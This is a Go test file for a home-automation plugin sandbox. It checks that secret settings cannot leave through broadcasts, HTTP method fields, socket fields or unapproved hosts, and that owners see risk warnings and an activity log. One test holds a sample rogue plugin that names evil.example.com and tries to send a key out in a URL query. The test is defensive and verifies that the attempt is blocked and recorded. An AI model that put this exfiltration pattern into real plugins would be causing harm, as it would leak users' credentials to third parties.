package extension

import (
	"context"
	"fmt"
	"home-control/internal/store"
	"home-control/plugin"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

func TestABroadcastCarriesNoSecret(t *testing.T) {
	head := `defineExtension({id:"a",name:"a",version:"1",access:{sockets:true,lan:true},settings:{key:{label:"K",type:"secret",required:true}},data:{fetch(c){`
	for name, payload := range map[string]string{
		"as it is": `c.crypto.hex(c.settings.key)`,
		"inside":   `c.crypto.hex("x" + c.settings.key)`,
	} {
		t.Run(name, func(t *testing.T) {
			m := run(t, folder(t, head+`return c.udp.discover(9, `+payload+`, {timeoutMs:20})}}});`), map[string]any{"key": "abcdefgh12"})
			failsWith(t, m, "can't be broadcast")
			expectViolation(t, m, "secret")
		})
	}
}

func TestAMethodMustBeAnHTTPVerb(t *testing.T) {
	address, hits := counted(t)
	source := func(method string) string {
		return `defineExtension({id:"a",name:"a",version:"1",access:{network:["api.example.com","{host}"]},settings:{host:{label:"H",type:"string",required:true},key:{label:"K",type:"secret",required:true,sendTo:["api.example.com"]}},
			data:{fetch(c){c.fetch("http://"+c.settings.host+"/",{method:` + method + `});return 1}}});`
	}
	given := map[string]any{"host": address, "key": "abcdefgh12"}
	m := run(t, folder(t, source(`c.settings.key`)), given, allowLoopback)
	failsWith(t, m, "method")
	expectViolation(t, m, "network")
	if hits.Load() != 0 {
		t.Fatal("the secret went out as a method")
	}
	for _, verb := range []string{"GET", "post", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"} {
		m := run(t, folder(t, source(strconv.Quote(verb))), given, allowLoopback)
		eventually(t, verb, func() bool { d, _, _ := m.plugins.Get("a"); return d != nil })
	}
}

func TestSecretsStayOutOfSocketFields(t *testing.T) {
	port, got := listener(t)
	p := strconv.Itoa(port)
	head := `defineExtension({id:"a",name:"a",version:"1",access:{sockets:true,lan:true,network:["api.example.com","{host}"]},settings:{host:{label:"H",type:"string",required:true},key:{label:"K",type:"secret",required:true,sendTo:["api.example.com"]}},data:{fetch(c){`
	given := map[string]any{"host": "127.0.0.1", "key": "abcdefgh12"}
	for name, call := range map[string]string{
		"the TLS server name": `c.tcp.connect(c.settings.host, ` + p + `, {tls:true, serverName:c.settings.key, timeoutMs:300})`,
		"a TCP write":         `c.tcp.connect(c.settings.host, ` + p + `).write(c.crypto.hex(c.settings.key))`,
		"a UDP scan":          `c.udp.scan(["127.0.0.1"], ` + p + `, c.crypto.hex(c.settings.key), {timeoutMs:50})`,
	} {
		t.Run(name, func(t *testing.T) {
			got.Store(0)
			m := run(t, folder(t, head+call+`;return 1}}});`), given, allowLoopback)
			expectViolation(t, m, "secret")
			time.Sleep(50 * time.Millisecond)
			if got.Load() != 0 {
				t.Fatalf("%d bytes were sent", got.Load())
			}
		})
	}
	t.Run("a server name that isn't one", func(t *testing.T) {
		m := run(t, folder(t, head+`c.tcp.connect(c.settings.host, `+p+`, {tls:true, serverName:"not a name!", timeoutMs:300});return 1}}});`), given, allowLoopback)
		failsWith(t, m, "serverName")
	})
	t.Run("a harmless server name is fine", func(t *testing.T) {
		m := run(t, folder(t, head+`try {c.tcp.connect(c.settings.host, `+p+`, {tls:true, serverName:"device.local", timeoutMs:300})} catch (e) {return String(e.message)}}}});`), given, allowLoopback)
		eventually(t, "the TLS error", func() bool { d, _, _ := m.plugins.Get("a"); return strings.Contains(string(d), "TLS") })
		if v := violationsOf(t, m, "a"); len(v) != 0 {
			t.Errorf("got %+v", v)
		}
	})
}

// The case the owner asked about: a plugin given a key, naming an attacker's host. It has to show the risk before it
// runs, it can't send the key there without the owner approving exactly that, and whatever it does use is on record.
func TestRoguePluginCantQuietlySendAKeyOut(t *testing.T) {
	var got atomic.Int32
	server := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { got.Add(1) }))
	defer server.Close()
	host := strings.TrimPrefix(server.URL, "http://")
	dir := t.TempDir()
	code := `let done = "";
	defineExtension({id:"rogue",name:"Rogue",version:"1",access:{network:["evil.example.com","{host}"]},
		settings:{host:{label:"H",type:"string",required:true},key:{label:"Cloud key",type:"secret",required:true}},
		data:{everySeconds:3600,fetch(ctx){
			ctx.fetch("http://"+ctx.settings.host+"/plain");
			try { ctx.fetch("http://"+ctx.settings.host+"/?k="+ctx.settings.key); done = "sent"; } catch (e) { done = String(e); }
			return {done};
		}}});`
	if err := os.WriteFile(filepath.Join(dir, entryFile), []byte(code), 0o600); err != nil {
		t.Fatal(err)
	}
	l, err := load(dir)
	if err != nil {
		t.Fatal(err)
	}
	warned := strings.Join(l.riskWarnings(), " ")
	if !strings.Contains(warned, "Cloud key") || !strings.Contains(warned, "evil.example.com") || !strings.Contains(warned, "steal") {
		t.Errorf("the owner isn't told the risk: %q", warned)
	}
	settings := map[string]any{"host": host, "key": "correct-horse-battery-staple"}
	if keys := l.accessKeys(settings); slices.ContainsFunc(keys, func(k string) bool { return strings.HasPrefix(k, "send:") }) {
		t.Errorf("no destination was named for the key, so none can be approved: %v", keys)
	}

	st := store.NewMemory()
	m := newManager(t.TempDir(), t.TempDir(), st, plugin.NewHub())
	m.allowLoopback = true
	inst := &instance{manager: m, status: Status{ID: "rogue"}, bindings: bindingsFor(l, settings)}
	n := newNetwork(l.access, settings, true)
	n.onViolation, n.onSend, n.onUse = inst.violate, inst.leak, inst.note
	if _, err := n.do(context.Background(), "http://"+host+"/plain", "GET", nil, ""); err != nil {
		t.Fatal(err)
	}
	if _, err := n.do(context.Background(), "http://"+host+"/?k=correct-horse-battery-staple", "GET", nil, ""); err == nil {
		t.Error("the key left with no sendTo naming where it may go")
	}
	if got.Load() != 1 {
		t.Errorf("%d requests arrived, want only the plain one", got.Load())
	}
	v, _ := st.Violations(context.Background(), "rogue", 5)
	if len(v) != 1 || v[0].Kind != "secret" {
		t.Errorf("the attempt wasn't recorded: %v", v)
	}
	seen, _ := st.Activity(context.Background(), "rogue", 5)
	if len(seen) != 1 || seen[0].Destination != host+"/plain" || seen[0].Kind != "http GET" {
		t.Errorf("what it did use isn't on record: %v", seen)
	}
}

func TestApprovingCoversWhereASecretMayGo(t *testing.T) {
	dir := t.TempDir()
	code := `defineExtension({id:"a",name:"a",version:"1",access:{network:["a.example.com","b.example.com"]},
		settings:{key:{label:"Key",type:"secret",sendTo:["a.example.com"]}},data:{fetch(){return 1}}});`
	if err := os.WriteFile(filepath.Join(dir, entryFile), []byte(code), 0o600); err != nil {
		t.Fatal(err)
	}
	l, err := load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(l.accessKeys(nil), "send:key:a.example.com") {
		t.Errorf("an update could move the key to another approved host with no new approval: %v", l.accessKeys(nil))
	}
	if !slices.Contains(l.accessLabels(nil), "Sends your Key to a.example.com") {
		t.Errorf("the owner isn't told where it goes: %v", l.accessLabels(nil))
	}
	warned := strings.Join(l.riskWarnings(), " ")
	if !strings.Contains(warned, "b.example.com") || strings.Contains(warned, "a.example.com") {
		t.Errorf("the warning should name only where it isn't meant to go: %q", warned)
	}
}

func TestActivityStaysBounded(t *testing.T) {
	st := store.NewMemory()
	m := newManager(t.TempDir(), t.TempDir(), st, plugin.NewHub())
	inst := &instance{manager: m, status: Status{ID: "x"}}
	for n := range maxActivityKept + 50 {
		inst.note("tcp", fmt.Sprint("10.0.0.", n))
	}
	inst.note("tcp", "10.0.0.1")
	inst.flushActivity()
	seen, _ := st.Activity(context.Background(), "x", maxActivityKept*2)
	if len(seen) != maxActivityKept+1 {
		t.Fatalf("%d rows, want %d and one for the rest", len(seen), maxActivityKept+1)
	}
	var total int64
	for _, a := range seen {
		total += a.Count
	}
	if total != int64(maxActivityKept+51) {
		t.Errorf("counted %d uses, want %d", total, maxActivityKept+51)
	}
}
